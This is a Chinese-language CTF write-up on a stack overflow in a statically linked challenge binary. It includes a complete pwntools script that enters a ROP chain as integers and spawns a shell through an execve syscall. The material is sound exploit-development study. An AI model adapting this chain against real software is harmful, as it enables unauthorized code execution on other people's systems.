这题刚开始看到malloc以为是堆溢出，但问题其实还是在底下memcpy那个地方，仍然是栈溢出  
然后有点懵逼，一方面输入是数字，不是字符串，就需要一些转化。  
酱紫就需要多次的输入，要把pattern create出来的字符串切得碎碎的放进去（啊不对是输入别的标志算偏移  
另一方面感觉题目的逻辑有点问题= =数字都还没输入完，输个5就能memcpy并退出了，有点蠢  
  
然后调试了下终于能覆盖eip了，输入15次数字，第16次输5保存的话刚好能正常退出，再多一次会覆盖地址  
却对跳到哪里有点迷惘。。scanf是有的，但没有system函数。。  
  
然后据说这题是静态编译过的~所以这时候就可以祭出ROPgadgets了，命令是  
ROPgadget --ropchain --badbytes 0A --binary pwn2  
注意其中的badbytes。。  
  
另外还get了一个新知识，就是free(0)是不会出错的，所以需要给它赋参数的时候0就可以~  
  
```python
from pwn import *
p=process('./pwn2')
p.recv()
r=raw_input()
p.sendline('160')#how many times of calculation

def input4bytes(number):
    p.recv()
    p.sendline('1')#choose an action
    p.recv()
    p.sendline('0')
    p.recv()
    p.sendline(str(number))

for i in xrange(16):
    input4bytes(0)



input4bytes(0x0806ed30) # pop edx ; pop ecx ; pop ebx ; ret
input4bytes(0x080ea060) # @ .data
input4bytes(0x41414141) # padding
input4bytes(0x41414141) # padding
input4bytes(0x080bb406) # pop eax ; ret
input4bytes(0x6e69622f)
input4bytes(0x08097416) # mov dword ptr [edx], eax ; pop ebx ; ret
input4bytes(0x41414141) # padding
input4bytes(0x0806ed30) # pop edx ; pop ecx ; pop ebx ; ret
input4bytes(0x080ea064) # @ .data + 4
input4bytes(0x41414141) # padding
input4bytes(0x41414141) # padding
input4bytes(0x080bb406) # pop eax ; ret
input4bytes(0x68732f2f)
input4bytes(0x08097416) # mov dword ptr [edx], eax ; pop ebx ; ret
input4bytes(0x41414141) # padding
input4bytes(0x0806ed30) # pop edx ; pop ecx ; pop ebx ; ret
input4bytes(0x080ea068) # @ .data + 8
input4bytes(0x41414141) # padding
input4bytes(0x41414141) # padding
input4bytes(0x08054730) # xor eax, eax ; ret
input4bytes(0x08097416) # mov dword ptr [edx], eax ; pop ebx ; ret
input4bytes(0x41414141) # padding
input4bytes(0x080481c9) # pop ebx ; ret
input4bytes(0x080ea060) # @ .data
input4bytes(0x0806ed31) # pop ecx ; pop ebx ; ret
input4bytes(0x080ea068) # @ .data + 8
input4bytes(0x080ea060) # padding without overwrite ebx
input4bytes(0x0806ed30) # pop edx ; pop ecx ; pop ebx ; ret
input4bytes(0x080ea068) # @ .data + 8
input4bytes(0x080ea068) # padding without overwrite ecx
input4bytes(0x080ea060) # padding without overwrite ebx
input4bytes(0x08054730) # xor eax, eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x0807b75f) # inc eax ; ret
input4bytes(0x08049781) # int 0x80

p.recv()
p.sendline('5')
p.interactive()
```
